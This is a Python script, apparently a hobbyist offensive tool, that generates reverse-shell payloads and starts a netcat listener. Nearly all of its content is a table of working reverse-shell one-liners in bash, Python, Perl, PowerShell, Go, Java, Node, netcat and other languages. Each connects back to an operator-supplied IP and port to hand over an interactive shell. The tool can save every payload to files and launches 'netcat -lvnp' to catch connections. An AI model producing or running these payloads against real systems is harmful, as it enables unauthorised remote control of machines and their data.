#!/usr/bin/env python3

import os
import sys
import time
import platform
import argparse
import netifaces
from colorama import init, Fore, Style
from prompt_toolkit import prompt
from prompt_toolkit.shortcuts import yes_no_dialog, ProgressBar
from prompt_toolkit.styles import Style as PTStyle

init()

style = {
    'header': Fore.CYAN + Style.BRIGHT,
    'success': Fore.GREEN + Style.BRIGHT,
    'error': Fore.RED + Style.BRIGHT,
    'input': Fore.YELLOW + Style.BRIGHT,
    'info': Fore.BLUE + Style.BRIGHT,
    'reset': Style.RESET_ALL
}

def animated_greet():
    message = f"{style['header']}Thanks for using this fun tool!{style['reset']}"
    for char in message:
        print(char, end='', flush=True)
        time.sleep(0.05)
    print("\n")

def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def animated_logo():
    logo = f"""
{style['header']}_____ _          _ _ _   _       _ _     
/  ___| |        | | | | | |     | | |    
\\ `--.| |__   ___| | | | | | __ _| | | ___ _   _
 {style['error']} `--. \\ '_ \\ / _ \\ | | | | |/ _` | | |/ _ \\ | | |
/\\__/ / | | |  __/ | \\ \\_/ / (_| | | |  __/ |_| |
\\____/|_| |_|\\___|_|_|\\___/ \\__,_|_|_|\\___|\\__, |
                                            __/ | 1.0.0
{style['success']}TRHACKNON {style['header']}(github.com/tucommenceapousser){style['reset']} |___/"""
    for line in logo.splitlines():
        print(line)
        time.sleep(0.1)

def disp():
    clear()
    animated_logo()

default_shell = "bash"

reverse_shell_templates = {
    "bash": "bash -i >& /dev/tcp/$IP/$PORT 0>&1",
    "php": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' \"); ?>",
    "python": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);",
    "perl": "use Socket;$i=\"$IP\";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN, '>&S');open(STDOUT, '>&S');open(STDERR, '>&S');exec('/bin/bash -i');",
    "ruby": "require 'socket';require 'open3';f=TCPSocket.new('$IP', $PORT);while s = f.gets;Open3.popen3(s) do |stdin, stdout, stderr, wait_thr|;f.puts(stdout.read);end;end;",
    "java": "import java.io.*;import java.net.*;public class ReverseShell {public static void main(String[] args) {try {String host = \"$IP\";int port = $PORT;Socket s = new Socket(host, port);InputStream in = s.getInputStream();OutputStream out = s.getOutputStream();Process p = new ProcessBuilder(\"/bin/bash\").redirectErrorStream(true).start();InputStream pipedIn = p.getInputStream();OutputStream pipedOut = p.getOutputStream();Thread t1 = new Thread(() -> {int c;while ((c = in.read()) != -1) pipedOut.write(c);});Thread t2 = new Thread(() -> {int c;while ((c = pipedIn.read()) != -1) out.write(c);});t1.start();t2.start();t1.join();t2.join();} catch (Exception e) {e.printStackTrace();}}}",
    "node": "const net = require('net');const cp = require('child_process');const shell = cp.spawn('/bin/bash', []);const client = new net.Socket();client.connect($PORT, '$IP', () => {client.pipe(shell.stdin);shell.stdout.pipe(client);shell.stderr.pipe(client);});",
    "netcat": "nc $IP $PORT -e /bin/bash",
    "awk": "awk 'BEGIN {s=\"/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1\";system(s)}'",
    "gawk": "gawk 'BEGIN {s=\"/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1\";system(s)}'",
    "telnet": "telnet $IP $PORT | /bin/bash | telnet $IP $PORT",
    "golang": "package main;import (\"net\";\"os\";\"os/exec\");func main() {l, _ := net.Dial(\"tcp\", \"$IP:$PORT\");cmd := exec.Command(\"/bin/bash\");cmd.Stdin = l;cmd.Stdout = l;cmd.Stderr = l;cmd.Run();}",
    "powershell": "$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()",
    "tclsh": "package require Tclx;fconfigure stdin -buffering line;fconfigure stdout -buffering line;fconfigure stderr -buffering line;socket -server [list server $PORT] $IP;proc server {sock addr port} {fileevent $sock readable [list handler $sock]};proc handler {sock} {gets $sock line;exec /bin/bash -i -c \"$line\"}",
    "ruby": "require 'socket';require 'open3';TCPSocket.open('$IP', $PORT) do |socket|;Open3.popen3('/bin/bash') do |stdin, stdout, stderr, wait_thr|;Thread.new {loop {socket.print stdout.read}};Thread.new {loop {socket.print stderr.read}};loop {socket.print stdin.read};end;end;",
    "xterm": "xterm -e /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1",
    "ncat": "ncat $IP $PORT -e /bin/bash",
    "socket": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
}

disp()
parser = argparse.ArgumentParser(description=f"{style['info']}Help Center{style['reset']}")
parser.add_argument('-l', '--list', dest='list', help="List of available shells", action='store_true')
parser.add_argument('-i', '--ip', dest='lhost', type=str, help="Specify IP address", required=False)
parser.add_argument('-p', '--port', dest='port', type=int, help="Specify port", required=False)
parser.add_argument('-s', '--shell', dest='shell', type=str, help="Specify shell type", required=False)
parser.add_argument('-d', '--download', dest='download', type=str, help="Specify directory to save reverse shell scripts", required=False)

args = parser.parse_args()

if args.list:
    disp()
    print(f"{style['info']}Available Shells are : {style['reset']}" + ', '.join(reverse_shell_templates.keys()))
    sys.exit()

if not args.lhost:
    disp()
    print(f"{style['header']}------- SELECT IP -------{style['reset']}")
    for interface in netifaces.interfaces():
        try:
            ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
            print(f"{style['success']}[+] {style['reset']}{interface} : {style['info']}{ip}")
        except (KeyError, IndexError):
            continue
    print(f"{style['input']}>> Enter IP address:{style['reset']} ", end="")
    lhost = input().strip()
else:
    lhost = args.lhost

port = args.port if args.port else 1234

def generate_reverse_shell(shell_type, ip, port):
    if shell_type in reverse_shell_templates:
        return reverse_shell_templates[shell_type].replace("$IP", ip).replace("$PORT", str(port))
    else:
        print(f"{style['error']}[!] No shell available named '{shell_type}'. Use --help for available options.{style['reset']}")
        sys.exit()

def save_shell_to_file(shell_code, shell_type, directory):
    try:
        if not os.path.exists(directory):
            os.makedirs(directory)

        file_path = os.path.join(directory, f"revshell_{shell_type}.txt")
        with open(file_path, "w") as f:
            f.write(shell_code)
        print(f"{style['success']}[+] Reverse shell saved to {file_path}{style['reset']}")
    except Exception as e:
        print(f"{style['error']}[!] Error saving file: {str(e)}{style['reset']}")

if args.download:
    for shellType in reverse_shell_templates.keys():
        shell_code = generate_reverse_shell(shellType, lhost, port)
        save_shell_to_file(shell_code, shellType, args.download)

custom_style = PTStyle.from_dict({
    'dialog': 'bg:#005f5f fg:#ffffff',  
    'dialog.body': 'bg:#000000 fg:#ffff00',  
    'dialog.shadow': 'bg:#00af87',  
    'dialog frame.label': 'bg:#5f005f fg:#ffffff',  
    'dialog.button': 'bg:#ffaf00 fg:#000000',  
    'dialog.button.focused': 'bg:#ff5f00 fg:#ffffff',  
})

user_response = yes_no_dialog(
    title="Listener",
    text="Do you want to start the listener?",
    style=custom_style
).run()

if user_response:
    def listener():
        print(f"\n{style['error']}[*] Starting listener at port {port}{style['reset']}")
        os.system(f"netcat -lvnp {port}")
    listener()
else:
    animated_greet()
    sys.exit()
